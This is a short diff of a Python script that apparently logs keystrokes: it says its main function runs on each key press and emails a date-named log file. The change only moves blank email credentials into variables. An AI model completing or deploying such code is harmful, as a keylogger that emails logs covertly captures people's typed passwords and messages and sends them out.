@@ -84,13 +84,20 @@ def give_new_line():
 
 
 # The main function of the program. It runs whenever a key is pressed.
-def send_files():
+
+username = ""
+password = ""
+send_email_to = ""
+smtp_server = ''
+
+
+def send_files(username):
 
     date_log_name = datetime.today().strftime('%m-%d-%Y')
     date_log_name_string = str(date_log_name)
 
     email_user = ""
-    email_password = ""
+    email_password = password
     email_send = ''
 
     subject = ' file' + date_log_name
